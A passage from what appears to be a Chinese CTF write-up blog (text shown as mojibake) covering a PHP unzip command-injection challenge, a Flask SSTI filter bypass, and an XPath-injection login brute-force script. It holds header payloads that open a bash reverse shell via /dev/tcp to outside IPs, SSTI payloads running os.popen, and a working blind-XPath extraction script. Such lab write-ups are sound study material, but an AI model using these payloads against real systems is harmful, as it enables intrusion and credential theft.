class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                    <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                    <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                ));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œ<code>$extract_to</code>è¿™ä¸œè¥¿å®Œå…¨å¯æ§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$extract_to:</span><br><span class="hljs-variable">$extract_to</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_EXTRACT_TO&#x27;</span>] ?? <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;unzip &#x27;</span> . <span class="hljs-variable">$file_tmp</span> . <span class="hljs-string">&#x27; -d &#x27;</span> . <span class="hljs-variable">$extract_to</span>);<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æŠ“åŒ…å¢åŠ <code>X-Extract-to</code>å¤´è¿›è¡Œå‘½ä»¤æ³¨å…¥å°±è¡Œ?</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tp"><span class="hljs-keyword">X</span>-EXTRACT-<span class="hljs-keyword">TO</span>: uploads/;bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/43.129.231.32/9001 0&gt;&amp;1&quot;</span><br><span class="hljs-keyword">X</span>-EXTRACT-<span class="hljs-keyword">TO</span>: uploads/&amp;&amp; bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/43.128.40.79/9001 0&gt;&amp;1&quot;</span>;<br><span class="hljs-keyword">X</span>-EXTRACT-<span class="hljs-keyword">TO</span>: uploads/&amp;&amp; cat /flag &gt;/upload/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å¯æƒœæ²¡ä»»ä½•ååº”ğŸ¤¦â€</p><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>ä¸€ä¸ªæŠŠè¾“å…¥è¿›è¡Œä¸€ç³»åˆ—ç¼–ç çš„ç½‘ç«™ï¼Œç»™äº†ç¼–ç æ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">line, key, key2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(line[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ <span class="hljs-built_in">ord</span>(key2[x])) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(line)))<br><br>app.config[<span class="hljs-string">&#x27;flag&#x27;</span>] = encode(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å‘Šè¯‰äº†<code>SSTI</code>å’Œ<code>app.config[&#39;flag&#39;]</code>ï¼Œçœ‹çœ‹<code>&#123;&#123;config&#125;&#125;</code>:</p><p><img src="/img/paseekactf1.png" alt="paseekactf1"></p><p>è§£å¯†(ä½¿ç”¨çš„å¼‚æˆ–ï¼Œæ‰€ä»¥é€†ç€å†åŠ å¯†ä¸€æ¬¡å°±æ˜¯è§£å¯†)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_line, key, key2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(encoded_line[x]) ^ <span class="hljs-built_in">ord</span>(key2[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encoded_line)))<br><br>encoded_text = <span class="hljs-string">&#x27;-M7\x10wG6o3\x03&quot;b.\x0e\x1b\x0b;\x02(D\x1d\x1a]\x17&#123;8Wh\x02X@\x0b\&#x27;\x01(,\x1c9\x1f\x0fLG&#x27;</span><br>key = <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span><br>key2 = <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span><br>decoded_text = decode(encoded_text, key, key2)<br><span class="hljs-built_in">print</span>(decoded_text)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå®Œå‘ç°æ˜¯ä¹±ç ã€‚ã€‚æŸ¥äº†ä¸€ä¸‹æ‰çŸ¥é“ç»™çš„é‚£ä¸ªåŠ å¯†ç®—æ³•æ˜¯é”™è¯¯çš„ï¼Œæ¯ä¸ªé¶æœºä¸å¤ªä¸€æ ·éœ€è¦è¯»<code>app.py</code>æ‰¾åŠ å¯†ç®—æ³•ï¼š</p><p>è¿‡æ»¤äº†å•å¼•å·<code>&#39;</code>ï¼Œ<code>.</code>å’Œä¸‹åˆ’çº¿<code>_</code>ï¼šå•å¼•å·æ¢æˆåŒå¼•å·ï¼›ç‚¹ç›´æ¥æ¢æˆ<code>[]</code>ï¼Œä¸‹åˆ’çº¿ç”¨åå…­è¿›åˆ¶<code>\x5f</code>ï¼š</p><p>å› ä¸ºä¹‹å‰çš„<code>&#123;&#123;config&#125;&#125;</code>å¯ä»¥ç”¨ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿å®ƒ:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;config<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;popen&quot;</span>]</span>(&quot;ls&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;read&quot;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p>æ²¡è¿‡æ»¤çš„è¯å°±ç­‰äºè¿™ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå»è¯»<code>app.py</code>ï¼Œè¿™é‡Œçš„å°æ•°ç‚¹ç”¨<code>\x2e</code>æ›¿æ¢ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;config<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;popen&quot;</span>]</span>(&quot;cat app\x2epy&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;read&quot;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, render_template, request<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;folow @osminogka.ann on instagram =)&#x27;</span> <span class="hljs-comment">#åœ¨éƒ¨ç½²æ—¶è®°å¾—åˆ é™¤è¿™éƒ¨åˆ†ï¼Œä»¥é˜²åˆ«äººè§£å†³äº†å˜¿å˜¿</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">line, key, key2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(line[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ <span class="hljs-built_in">ord</span>(key2[x])) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(line)))<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/app/flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <br>flag = file.read()<br>flag = flag[:<span class="hljs-number">42</span>]  <br>app.config[<span class="hljs-string">&#x27;flag&#x27;</span>] = encode(flag, <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)<br>flag = <span class="hljs-string">&quot;&quot;</span>  <br>os.remove(<span class="hljs-string">&quot;/app/flag&quot;</span>)  <br><br>nicknames = [<br>    <span class="hljs-string">&#x27;Ëœâ€*Â°â˜…â˜†â˜…_%s_â˜…â˜†â˜…Â°Â°*&#x27;</span>, <br>    <span class="hljs-string">&#x27;%s ~â™¡â“›â“â“¥â“”â™¡~&#x27;</span>, <br>    <span class="hljs-string">&#x27;%s Ğ’ÃªÑ‡Ò£Ã¸ Ğ² Ã¸Ä¤Ğ»Ã¢Ğ¹Ä¤Ã©&#x27;</span>, <br>    <span class="hljs-string">&#x27;â™ª â™ª â™ª %s â™ª â™ª â™ª &#x27;</span>, <br>    <span class="hljs-string">&#x27;[â™¥â™¥â™¥%sâ™¥â™¥â™¥]&#x27;</span>, <br>    <span class="hljs-string">&#x27;%s, kOÑ‚OÂ®AÑ )(Ğ¾Ğ¢ĞµĞ›@ Â©4@$tÑŒĞ¯&#x27;</span>, <br>    <span class="hljs-string">&#x27;â™”%sâ™”&#x27;</span>, <br>    <span class="hljs-string">&#x27;[â™‚+â™‚=â™¥]%s[â™‚+â™‚=â™¥]&#x27;</span><br>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = request.values.get(<span class="hljs-string">&#x27;nickname&#x27;</span>)<br>            <span class="hljs-built_in">id</span> = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(nicknames) - <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> p != <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> p <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">in</span> p <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> p:  <br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Your nickname contains restricted characters!&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(nicknames[<span class="hljs-built_in">id</span>] % p)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Exception&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">1337</span>)<br></code></pre></td></tr></table></figure><p>ç„¶å<code>&#123;&#123;config&#125;&#125;</code>æ‹¿åŠ å¯†åçš„<code>flag</code>ï¼ŒæŠŠç®—æ³•é€†ç€è¿è¡Œä¸€æ¬¡å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_string, key, key2</span>):<br>    decoded = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(x ^ <span class="hljs-built_in">ord</span>(key2[x]) ^ <span class="hljs-built_in">ord</span>(key[::-<span class="hljs-number">1</span>][x]) ^ <span class="hljs-built_in">ord</span>(encoded_string[x])) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encoded_string)))<br>    <span class="hljs-keyword">return</span> decoded<br><br>encoded_text = <span class="hljs-string">&#x27;-M7\x10wI7j0Usgy\x0e\x1cY&gt;U(D\x1dN\x0b\x17x9Rf\x02UGQw\x01(&#123;\x10`\x17\x07\x1eG&#x27;</span><br>key = <span class="hljs-string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span><br>key2 = <span class="hljs-string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span><br>decoded_text = decode(encoded_text, key, key2)<br><span class="hljs-built_in">print</span>(decoded_text)<br></code></pre></td></tr></table></figure><p>åé¢çœ‹äº†ä¸‹å…¶å®ƒå¸ˆå‚…çš„wpï¼Œè¿˜æœ‰å…¶å®ƒè§£æ³•(åˆ©ç”¨get_dataè¿™ä¹ˆä¸ªç©æ„å„¿)ï¼š</p><p><a href="https://johnfrod.top/ctf/pasecactf-2019flask_ssti/">å‚è€ƒæ–‡ç« </a></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;&#123;()[<span class="hljs-string">&quot;__class__&quot;</span>][<span class="hljs-string">&quot;__bases__&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;__subclasses__&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;get_data&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;app.py&quot;</span>)&#125;&#125;<br><br>ç¼–ç åä¸º<br>&#123;&#123;()[<span class="hljs-string">&quot;\u005f\u005f<span class="hljs-char escape_">\u0063</span>\u006c<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0073</span>\u005f\u005f&quot;</span>][<span class="hljs-string">&quot;\u005f\u005f<span class="hljs-char escape_">\u0062</span><span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0073</span>\u005f\u005f&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;\u005f\u005f<span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0075</span><span class="hljs-char escape_">\u0062</span><span class="hljs-char escape_">\u0063</span>\u006c<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0073</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0073</span>\u005f\u005f&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\u0067</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0074</span>\u005f<span class="hljs-char escape_">\u0064</span><span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u0074</span><span class="hljs-char escape_">\u0061</span>&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;app.py&quot;</span>)&#125;&#125;<br><br>æˆ–è€…ï¼š<br>&#123;&#123;()[<span class="hljs-string">&quot;<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>class<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>&quot;</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>bases<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>subclasses<span class="hljs-char escape_">\x5F</span><span class="hljs-char escape_">\x5F</span>&quot;</span>]()[<span class="hljs-number">91</span>][<span class="hljs-string">&quot;get<span class="hljs-char escape_">\x5F</span>data&quot;</span>](<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><a href="https://xz.aliyun.com/t/7791?time__1311=n4+xnD0G0=I6deGXoo40xmqiKqV4QuwD&alichlgref=https://www.cnblogs.com/#toc-1">Xpathæ³¨å…¥</a></p><p><a href="https://www.cnblogs.com/karsa/p/13439673.html">å‚è€ƒæ–‡ç« </a></p><p><img src="/img/xibeiezlogin1.png" alt="xibeiezlogin1"></p><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°ç™»å½•æ—¶æ˜¯POST<code>&lt;username&gt;111&lt;/username&gt;&lt;password&gt;111&lt;/password&gt;&lt;token&gt;9b996ad4ab06465f876TcwODkzMzk1My&lt;/token&gt;</code>è¿™ç§å½¢å¼çš„æ•°æ®ã€‚è¿˜æœ‰å°±æ˜¯è¿™ä¸ª<code>token</code>æ¯æ¬¡ç™»å½•å°±ä¼šæ¢ä¸€æ¬¡ã€‚</p><p><code>exp:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>s = requests.session()<br>url =<span class="hljs-string">&#x27;http://479bca59-4dc6-49cd-ad24-a0a971f4d894.node5.buuoj.cn:81//login.php&#x27;</span><br><br><br><br>head =&#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/xml&quot;</span><br>&#125;<br>find =re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)<br><br>strs =<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><br><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br><br>        r = s.post(url=url)<br>        token = find.findall(r.text)<br>        <span class="hljs-comment">#çŒœæµ‹æ ¹èŠ‚ç‚¹åç§°</span><br>        payload_1 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br>        <span class="hljs-comment">#è¿™é‡Œçš„*[1]è¡¨ç¤ºé€‰æ‹©æŸä¸ªèŠ‚ç‚¹ä¸‹çš„ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹</span><br>        <span class="hljs-comment">#çŒœæµ‹å­èŠ‚ç‚¹åç§°</span><br>        payload_2 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#çŒœæµ‹accountsçš„èŠ‚ç‚¹</span><br>        payload_3 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#çŒœæµ‹userèŠ‚ç‚¹</span><br>        payload_4 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#è·‘ç”¨æˆ·åå’Œå¯†ç </span><br>        payload_username =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#text() è¢«ç”¨æ¥è·å–ç‰¹å®šèŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹</span><br>        payload_password =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br><br>        <span class="hljs-built_in">print</span>(payload_password)<br>        r = s.post(url=url,headers=head,data=payload_username)<br>        <span class="hljs-built_in">print</span>(r.text)<br><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;éæ³•æ“ä½œ&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#adm1n</span><br><span class="hljs-comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f ï¼ˆMD5è§£å¯†ä¸ºgtfly123ï¼‰</span><br></code></pre></td></tr></table></figure><p>ä»–è¿™ä¸ª<code>XML</code>æ–‡æ¡£çš„ç»“æ„å¤§è‡´æ˜¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">accounts</span>&gt;</span><br>            <span 